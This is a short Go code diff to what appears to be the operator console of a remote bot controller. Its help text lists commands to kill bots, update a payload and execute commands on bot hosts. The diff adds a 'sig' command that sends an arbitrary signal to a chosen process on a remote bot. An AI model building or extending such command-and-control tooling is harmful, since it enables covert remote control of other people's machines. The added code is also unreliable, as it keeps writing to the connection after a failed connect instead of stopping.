@@ -10,6 +10,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"strconv"
 	"sync"
 
 	"io/ioutil"
@@ -137,7 +138,8 @@ bot pull (all | select)
 bot sync $bot_id
 bot [kill | reconn | pkill | bg | ddd | zero] $bot_id
 bot update $bot_id $payload_path
-bot [rm|call] $bot_id $exec`
+bot [rm|call] $bot_id $exec
+bot sig $bot_id $pid $signal_code`
 		return
 	}
 
@@ -358,6 +360,31 @@ bot [rm|call] $bot_id $exec`
 			return
 		}
 		Vln(3, "[", args[0], "]", fp, id)
+
+	case "sig":
+		if len(args) < 4 {
+			hasout, out = true, "not enough"
+			return
+		}
+
+		pid, err := strconv.Atoi(args[2])
+		if err != nil {
+			out = "pid err...\n"
+			return
+		}
+		sig, err := strconv.Atoi(args[3])
+		if err != nil {
+			out = "signal code err...\n"
+			return
+		}
+
+		hasout, out = true, "ok...\n"
+		p1, err := admin.GetConn2Client(args[1], base.B_psig)
+		if err != nil {
+			out = "err..." + err.Error() + "\n"
+		}
+		kit.WriteVLen(p1, int64(pid))
+		kit.WriteVLen(p1, int64(sig))
 
 	default:
 		hasout, out = true, ""
